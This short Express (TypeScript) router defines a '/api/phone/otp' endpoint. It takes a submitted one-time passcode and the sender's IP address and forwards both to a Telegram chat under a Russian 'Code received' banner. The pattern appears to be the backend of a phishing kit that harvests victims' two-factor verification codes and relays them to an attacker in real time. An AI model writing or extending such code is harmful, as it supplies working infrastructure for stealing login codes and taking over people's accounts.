import express from 'express';
import { sendTelegramMessage } from '../utils/telegramSender';
const router = express.Router();

router.post('/api/phone/otp', async (req, res) => {
    const otp = req.body.otp;
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    if (Array.isArray(clientIP)) {
        clientIP = clientIP[0];
    } else if (!clientIP || clientIP === "") {
        clientIP = "IP неизвестен";
    }   

     const messageText = `
        <b>🔔Получен код🔔</b>\n\n💬 <b>${otp}</b>
    `;

    const result = await sendTelegramMessage(clientIP, messageText);
    res.json(result);
});

export default router;
